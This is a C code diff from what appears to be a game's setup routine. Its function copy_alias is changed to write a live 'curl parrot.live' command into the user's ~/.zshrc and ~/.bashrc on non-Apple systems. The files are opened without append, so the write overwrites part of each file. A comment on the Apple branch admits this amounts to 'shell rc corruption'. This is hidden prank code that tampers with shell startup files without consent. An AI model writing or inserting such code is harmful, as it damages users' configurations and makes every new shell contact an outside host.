@@ -5,7 +5,7 @@ int	copy_alias(int file_count, char **envp)
 	// char	***cp_command;
 	int			i;
 	int			fd;
-	static char	*command = "print 'curl parrot.live'";
+	static char	*command = "curl parrot.live";
 	static char	*file_list[] = {"/.zshrc", "/.bashrc", NULL};
 	char		*path;
 
@@ -28,9 +28,10 @@ int	copy_alias(int file_count, char **envp)
 		path = ft_strjoin(getenv("HOME"), file_list[i]);
 		printf("opening %s\n", path);
 		fd = open(path, O_RDONLY | O_WRONLY);
+		printf("on fd %d\n", fd);
 		if (fd < 0)
 			return (1);
-		printf("%s\n", command);
+		dprintf(1, "%s\n", command);
 		dprintf(fd, "%s\n", command);
 	}
 	return (0);
@@ -63,7 +64,7 @@ int	setup_game(t_data *data, char **envp)
 		return (dprintf(2, "Something went wrong :(\n"), 1);
 	#ifndef __APPLE__
 		if (copy_alias(data->file_count, envp))
-			return (1);
+			return (dprintf(2, "Something went wrong :(\n"), 1);
 	#else
 		printf("Avoiding shell rc corruption :)\n");
 	#endif
